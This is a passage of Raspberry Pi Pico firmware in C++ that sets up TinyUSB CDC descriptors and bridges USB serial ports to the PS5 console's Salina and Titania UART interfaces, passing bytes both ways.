  PIO pio_{};
  uint sm_tx_{};
  uint sm_rx_{};
  uint offset_tx_{};
  uint offset_rx_{};
  uint baudrate_{};
};

static constexpr tusb_desc_device_t s_usbd_desc_device = {
    .bLength = sizeof(tusb_desc_device_t),
    .bDescriptorType = TUSB_DESC_DEVICE,
    .bcdUSB = 0x0200,
    .bDeviceClass = TUSB_CLASS_MISC,
    .bDeviceSubClass = MISC_SUBCLASS_COMMON,
    .bDeviceProtocol = MISC_PROTOCOL_IAD,
    .bMaxPacketSize0 = CFG_TUD_ENDPOINT0_SIZE,
    .idVendor = 0x2E8A,
    .idProduct = 0x5000,
    .bcdDevice = 0x0100,
    .iManufacturer = 1,
    .iProduct = 2,
    .iSerialNumber = 0,
    .bNumConfigurations = 1,
};

static const std::u16string s_string_descs[]{
    {0x0409},
    u"symbrkrs",
    u"ps5 salina/titania uart",
};

enum {
  ITF_NUM_CDC_0 = 0,
  ITF_NUM_CDC_0_DATA,
  ITF_NUM_CDC_1,
  ITF_NUM_CDC_1_DATA,
  ITF_NUM_CDC_2,
  ITF_NUM_CDC_2_DATA,
#ifdef ENABLE_DEBUG_STDIO
  ITF_NUM_CDC_3,
  ITF_NUM_CDC_3_DATA,
#endif
  ITF_NUM_TOTAL
};

consteval u8 ep_addr(u8 num, tusb_dir_t dir) {
  return ((dir == TUSB_DIR_IN) ? 0x80 : 0) | num;
}

enum : u8 {
  EP_NUM_NOTIF_0 = 1,
  EP_NUM_DATA_0,
  EP_NUM_NOTIF_1,
  EP_NUM_DATA_1,
  EP_NUM_NOTIF_2,
  EP_NUM_DATA_2,
#ifdef ENABLE_DEBUG_STDIO
  EP_NUM_NOTIF_3,
  EP_NUM_DATA_3,
#endif
};

#define CDC_DESCRIPTOR(num)                                              \
  TUD_CDC_DESCRIPTOR(                                                    \
      ITF_NUM_CDC_##num, 0, ep_addr(EP_NUM_NOTIF_##num, TUSB_DIR_IN), 8, \
      ep_addr(EP_NUM_DATA_##num, TUSB_DIR_OUT),                          \
      ep_addr(EP_NUM_DATA_##num, TUSB_DIR_IN), TUSB_EPSIZE_BULK_FS)

#define USBD_DESC_LEN (TUD_CONFIG_DESC_LEN + TUD_CDC_DESC_LEN * CFG_TUD_CDC)

#ifdef ENABLE_DEBUG_STDIO
// 0 is taken by pico_stdio_usb
#define CDC_IF_START 1
#else
#define CDC_IF_START 0
#endif
#define CDC_IF_SALINA CDC_IF_START
#define CDC_IF_TITANIA_0 (CDC_IF_START + 1)
#define CDC_IF_TITANIA_1 (CDC_IF_START + 2)

static constexpr u8 s_config_desc[USBD_DESC_LEN] = {
    TUD_CONFIG_DESCRIPTOR(1, ITF_NUM_TOTAL, 0, USBD_DESC_LEN, 0, 100),
    CDC_DESCRIPTOR(0),
    CDC_DESCRIPTOR(1),
    CDC_DESCRIPTOR(2),
#ifdef ENABLE_DEBUG_STDIO
    CDC_DESCRIPTOR(3),
#endif
};

extern "C" {
uint8_t const* tud_descriptor_device_cb() {
  return reinterpret_cast<const uint8_t*>(&s_usbd_desc_device);
}

uint8_t const* tud_descriptor_configuration_cb(uint8_t index) {
  return s_config_desc;
}

uint16_t const* tud_descriptor_string_cb(uint8_t index, uint16_t langid) {
  static uint16_t s_string_desc_buf[1 + 64];
  constexpr size_t max_bytelen =
      sizeof(s_string_desc_buf) - offsetof(tusb_desc_string_t, unicode_string);
  auto string_desc = reinterpret_cast<tusb_desc_string_t*>(&s_string_desc_buf);
  string_desc->bDescriptorType = TUSB_DESC_STRING;
  string_desc->bLength = 0;

  if (index < std::size(s_string_descs)) {
    auto& desc = s_string_descs[index];
    auto desc_len = desc.size() + 1;
    auto desc_bytelen = desc_len * sizeof(desc[0]);
    if (desc_bytelen <= max_bytelen) {
      std::memcpy(string_desc->unicode_string, desc.c_str(), desc_bytelen);
      string_desc->bLength = desc_bytelen;
    }
  }

  return s_string_desc_buf;
}
}

static UcmdClientEmc s_emc;
static Efc s_efc;
static PioUart s_pio_uart;

// tinyusb already double buffers: first into EP
// buffer(size=CFG_TUD_CDC_EP_BUFSIZE), then a
// ringbuffer(CFG_TUD_CDC_RX_BUFSIZE).
// There is tud_cdc_n_set_wanted_char/tud_cdc_rx_wanted_cb, but the api kinda
// sucks as you'll have to rescan the fifo for the wanted_char (after tinyusb
// already scanned). Oh well.
void tud_cdc_rx_wanted_cb(u8 itf, char wanted_char) {
  // emc considers \n as end of cmd (configurable). echos input
  // efc considers \r as end of cmd. echos \r\n for input \r

  // emc interface makes assumption that multiple cmds will not be in tinyusb rx
  // ringbuffer simultaneously. this sucks but should be fine in practice.

  if (itf != CDC_IF_SALINA) {
    return;
  }
  // emc - line buffer
  const u32 avail = tud_cdc_n_available(itf);
  std::string line(avail, '\0');
  if (tud_cdc_n_read(itf, line.data(), avail) == avail) {
    line.resize(line.find_first_of(wanted_char));
    s_emc.process_cmd(itf, line);
  }
}

// efc/pio - passthrough
void tud_cdc_rx_cb(u8 itf) {
  if (itf == CDC_IF_TITANIA_1) {
    const u32 avail = tud_cdc_n_available(itf);
    std::vector<u8> buf(avail);
    if (tud_cdc_n_read(itf, buf.data(), avail) == avail) {
      s_pio_uart.write_from_usb(buf.data(), avail);
    }
    return;
  }
  if (itf != CDC_IF_TITANIA_0) {
    return;
  }
  const u32 avail = tud_cdc_n_available(itf);
  std::vector<u8> buf(avail);
  if (tud_cdc_n_read(itf, buf.data(), avail) == avail) {
    s_efc.uart_.write_blocking(buf.data(), avail, false);
  }
}

int main() {
  set_sys_clock_khz(280'000, true);

  if (!tusb_init()) {
    return 1;
  }

#ifdef ENABLE_DEBUG_STDIO
  if (!stdio_usb_init()) {
    return 1;
  }
#endif

  if (!s_emc.init()) {
    return 1;
  }
  if (!s_efc.init()) {
    return 1;
  }
  if (!s_pio_uart.init()) {
    return 1;
  }

  // setup for emc to use tud_cdc_rx_wanted_cb
  tud_cdc_n_set_wanted_char(CDC_IF_SALINA, '\n');

  while (true) {
    // let tinyusb process events
    // will call into the usb -> uart path
    tud_task();

    // uart -> usb
    s_emc.cdc_process(CDC_IF_SALINA);
    s_efc.cdc_process(CDC_IF_TITANIA_0);
    s_pio_uart.cdc_process(CDC_IF_TITANIA_1);

    if (get_bootsel_button()) {
      reset_usb_boot(0, 0);
    }
  }
  return 0;
}
